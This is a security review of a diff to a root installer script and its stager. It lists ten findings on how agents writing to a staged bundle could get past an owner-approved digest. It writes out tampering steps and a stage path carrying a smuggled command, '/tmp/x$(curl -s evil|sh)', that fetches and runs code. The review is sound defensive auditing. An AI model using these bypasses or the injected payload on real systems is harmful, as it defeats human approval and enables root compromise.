## Scope note

Read only the diff. Two findings depend on rows of `run_plan` that the diff shows only partially (`row_deploy_tree`'s copy step, the row that installs `units/` and `config/`); I flag that dependency inline rather than assuming.

---

### 1. Blocker-ish / Major — `runtime/` is not pinned exactly: directories are outside every manifest

**`install-sea-forge-gateway.sh` → `verify_tree`, `compute_stage_digest`; `gateway-setup.ts` → `stageRuntime`/`stageDigest`**

The bundle is pinned by (a) the digest, which covers *regular files outside `runtime/` only*, (b) `runtime-manifest.sha256` (files only), (c) `runtime-symlinks.tsv` (links only). Nothing pins **directories** in `runtime/` — not their names, not their count, not their nesting. `verify_tree` explicitly allows `-type d` and never enumerates them, and the post-copy check `verify_tree "$new"` has the same gap.

Exploit (after the owner records the digest, before `sudo`):

```
mkdir -p ~/.cache/godspeed/gateway-stage/runtime/lib/node_modules/.bin
mkdir ~/.cache/godspeed/gateway-stage/runtime/logs
```

Digest is unchanged (no file added), `runtime-manifest.sha256` unchanged, `runtime-symlinks.tsv` unchanged, so the install proceeds; `row_deploy_tree`'s `cp -a` + `chown -R` + `find -type d -exec chmod 0755` creates them root-owned inside the deployed runtime, with `verify_tree "$new"` passing. The owner has no way to detect it from the digest. This is precisely the "install exactly the approved bytes and nothing else" invariant, and both the header comment ("runtime/ must equal runtime-manifest.sha256 … and runtime-symlinks.tsv") and the "nothing root reads goes unbound" comment are false: pre-creating a directory that a later package/service populates (or a `bin` dir the unit's `PATH` picks up) is an unapproved root-owned path.

Fix direction: pin the directory set too (emit `dir\tpath` lines in the same TSV, and compare `find -type d`), or reject any directory the manifest doesn't imply.

---

### 2. Major — the symlink list is delimiter-ambiguous and the install-time name guard is weaker than the stager's

**`install-sea-forge-gateway.sh` → `verify_tree` (symlink block); `gateway-setup.ts` → `assertPlainName`**

`want`/`got` are line sets of `symlink\t<target>\t<path>` built from raw `%l` and `%P`, compared with `[ "$want" != "$got" ]`. The only install-time guard is `find "$dir" -name $'*\n*'`, which:

* allows `\t` even though the stager's own `assertPlainName` documents that "the manifest formats … cannot carry safely" tabs;
* checks **basenames only**, so a `\t` or `\n` inside a link **target** (`%l`) is never rejected.

Consequences: the comparison is not injective. Two different trees produce the same `want`:

* approved line `symlink⟨TAB⟩a⟨TAB⟩b⟨TAB⟩c` is produced both by `path="b\tc", target="a"` and by `path="c", target="a\tb"`;
* a single link whose target embeds `\n` emits *two* TSV lines (`symlink⟨TAB⟩a` + `symlink⟨TAB⟩b⟨TAB⟩c`), so one tree entry can satisfy two approved lines.

Since `runtime/` is pruned from the digest, the tree is bound to the owner's approval only through this lossy text. An agent that can write the stage after approval can therefore install a link whose path or target differs from the approved one (`want == got` still holds), and the "extra, missing or changed target" refusal never fires. The in-tree/relative check still applies, so impact is bounded to substitute in-tree links — but it is exactly the digest-bypass class this design claims to close. Fix: reject `[\n\r\t\\]` in both `%P` and `%l` at install time (same regex as `assertPlainName`), or stop using a text format for the check.

---

### 3. Minor (Major if any row copies with attribute preservation) — the digest approves content only, `cp -a` carries mode bits into root's snapshot

**`install-sea-forge-gateway.sh` → `cp -a --no-preserve=ownership "$STAGE_SRC/." "$SNAP/stage/"`, `compute_stage_digest`; `gateway-setup.ts` → `stageDigest`**

`--no-preserve=ownership` drops *only* ownership; `-a` still preserves mode, setuid/setgid/sticky, timestamps, xattrs and hard-link topology. The digest hashes file contents and names, so an agent can run `chmod 4755 units/godspeed-horizon.service` or `chmod 0777 config/policy.yaml` at any time and the approved digest is unchanged. Root then reads those files from the snapshot with the attacker's mode bits attached.

The script's own "dirs 0755, files 0644" invariant is enforced *only* for the runtime tree (`row_deploy_tree`'s two `find … -exec chmod`). For `units/` and `config/` the modes reach the destination through whatever the (not-shown) row does. If it is `cp -p`, `install -p`, or `install` without `-m`, a world-writable or setuid file appears in a root-owned systemd/config path — local root escalation via a unit file any local user can edit. Verify this row; if it forces `-m 0644`, downgrade to a hardening note (the digest still does not approve the metadata root installs).

---

### 4. Major — required-file list omits what root reads from `config/`, so `--verify-only` blesses an uninstallable bundle

**`install-sea-forge-gateway.sh` → the `for f in plan.tsv runtime-manifest.sha256 runtime-symlinks.tsv status.json units/…` guard; `compute_stage_digest`**

`config/server.yaml.in` and `config/policy.yaml` are consumed by root (`renders server.yaml … and places policy.yaml`) and are covered by the digest *if present*, but the regular-file/`! -L` guard list does not include them, and nothing requires them to exist. Delete both, run the owner's new review command:

```
scripts/install-sea-forge-gateway.sh --verify-only --expect-stage-sha256 <digest of the truncated bundle>
# verify-only: ok; …
```

`--verify-only` never reads the plan or the templates, so it prints "ok"; the owner approves that digest; `sudo … --authorize-privileged` then applies the plan row by row and only fails when it tries to render `server.yaml` — after users, groups, directories, units and the binary are already in place. That is a half-applied system from a bundle the preflight advertised as good. The preflight should enumerate *every* path root reads, and additionally assert the plan/config parse.

---

### 5. Minor — the test seam can falsify the property it exists to demonstrate, and its gate is the real UID

**`install-sea-forge-gateway.sh` → `INSTALLER_TEST_HOOK_AFTER_SNAPSHOT` block**

Two problems:

1. The hook is `bash "$INSTALLER_TEST_HOOK_AFTER_SNAPSHOT"` executed by the invoker, *after* the snapshot and *before* the digest comparison. `$SNAP` is not exported, but `$TMPDIR` is, so the hook can just glob `$TMPDIR/gateway-snapshot.*/stage` — and since the invoker owns that directory, the hook can rewrite `plan.tsv` or `runtime/` **inside the snapshot**. The seam therefore cannot distinguish "the installer read only the snapshot" from "the hook tampered with the snapshot": it can produce a false *pass* for anything, and it can also make the run fail by deleting the snapshot.
2. The barrier is `[ "$(id -u)" != 0 ]` — the **real** UID, not `$EUID`. Anything that runs the installer with euid 0 and a non-zero real uid (setuid wrapper, some `sudo`/`setcap`/container entrypoints) hits the branch with effective root and executes an environment-named script **before any verification**. Arming it requires only `INSTALLER_TEST_MODE=1` + `INSTALLER_TEST_HOOK_AFTER_SNAPSHOT=…` in the environment.

Test seams in a root installer should be compiled out, gated on an explicit non-default build flag, and only able to touch the *original* stage — not the trust-boundary copy.

---

### 6. Minor — `snapshot_file`'s `-f`/`! -L` pair is TOCTOU and the open is not `O_NOFOLLOW`

**`install-sea-forge-gateway.sh` → `snapshot_file`**

`[ -f "$src" ]` follows symlinks; `[ ! -L "$src" ]` is a separate lookup; `cp` is a third. Between them the agent can swap `--binary`/`--bun` for a symlink, a fifo, or a blocking procfs regular file. Content is still pinned by the later `sha256sum`, so no code execution — but root is made to copy an arbitrary host file into the snapshot (and `cp /proc/kmsg`-style paths block root indefinitely), and the two checks buy nothing because they are not applied at open time. Take the fd once (`exec {fd}<…` / `cp --no-dereference` is the wrong direction here; a stat on the opened fd is the right one) and hash from that fd.

---

### 7. Minor — the printed apply command is not shell-quoted

**`install-sea-forge-gateway.sh` → final `echo "  sudo $0 --authorize-privileged --stage $STAGE_SRC --binary ${BINARY_SRC:-…} …"`**

`$0`, `$STAGE_SRC`, `$BINARY_SRC`, `$BUN_SRC` are interpolated unquoted into a line the owner is instructed to paste into a root shell. `HORIZON_GATEWAY_STAGE` is attacker-writable (agents run as the owner), so a stage path such as `/tmp/x$(curl -s evil|sh)` or one containing spaces/`;` produces a command the owner may execute as root. This pre-existed, but the line was touched and now carries two additional unquoted paths (`BINARY_SRC`, `BUN_SRC`) and the new snapshot semantics. Use `printf '%q'` for every interpolated word.

---

### 8. Minor — the stage *root* is followed if swapped for a symlink; only the binary/bun paths get `! -L`

**`install-sea-forge-gateway.sh` → `[ -d "$STAGE_SRC" ] || refuse …` then `cp -a "$STAGE_SRC/." "$SNAP/stage/"`**

`-d` follows symlinks and there is no `-L` refusal for the stage (unlike `snapshot_file`). If the agent replaces `~/.cache/godspeed/gateway-stage` (or whatever `HORIZON_GATEWAY_STAGE` names) with a symlink to `/` or `/home`, root recursively copies an arbitrary tree into `/run` with mode bits preserved, filling `/run`/disk. Fail-closed at the digest, so no install — but it is an unauthenticated root-side IO/disk DoS and it makes root read trees the operator never named. Resolve once (`readlink -f`) and refuse a symlinked leaf, or at least `[ ! -L ]`.

---

### 9. Minor — the stager no longer owns the whole stage, but the digest now covers the whole stage

**`gateway-setup.ts` → `stage()` cleanup list vs. `stageDigest`; `install-sea-forge-gateway.sh` → `cp -a` + `compute_stage_digest`**

`stage()` still deletes only seven known paths, while `stageDigest` (and the installer's digest) now covers *every* regular file outside `runtime/` and *refuses* any other entry type. Since agents can write the stage at any time:

* a planted **regular** file (`config/server.yaml.in.bak`, an editor swap file, an agent's note) silently becomes part of the digest the owner approves, i.e. the owner approves bytes the stager never produced and root never installs — pure confusion at best, and it destroys the "digest identifies one specific honest bundle" property;
* a planted **fifo/socket/symlink** outside `runtime/` makes `stageDigest` throw (`non-regular entry in the stage outside runtime`) and/or makes root's snapshot fail (`cp -a` cannot copy a socket) — a permanent, zero-cost DoS on the install that survives every retry until the owner manually cleans `~/.cache/godspeed/gateway-stage`.

Either recreate the stage directory from scratch (`rm -rf` + `mkdir` at the top of `stage()`), or compute the digest over a declared list rather than "whatever is in the directory".

---

### 10. Minor — `--verify-only` silently downgrades an apply, and it is not a review

**`install-sea-forge-gateway.sh` → `if [ "$VERIFY" = 1 ]; then APPLY=0; MODE=verify-only; fi`**

`--authorize-privileged --verify-only` is not refused (only `--dry-run`/`--check` combinations are); `VERIFY` wins, `APPLY` is cleared, the root check is skipped, and the script prints `verify-only: ok … Nothing installed.` with exit 0. A wrapper or operator that adds `--verify-only` gets a success exit from a root install that did nothing. Conversely, the new mode is documented as the review step ("runs snapshot + digest + tree checks and exits") but prints neither `plan.tsv` nor the config templates — so the human approval gate reduces to approving a hash of a plan the owner never saw, which is weaker than the dry-run path it replaces.

---

**Summary of severity:** 3 × Major (#1 exact-install invariant broken silently, #2 symlink-list bypass, #4 `verify-only` blesses uninstallable bundles), 6 × Minor (#3 metadata not approved, #5 test seam, #6 TOCTOU on sources, #7 unquoted advisory command, #8 symlinked stage root, #9 stage ownership, #10 verify/apply conflation). #3 escalates to a Blocker only if the unit/config-installing row copies with `-p`/inherits source modes.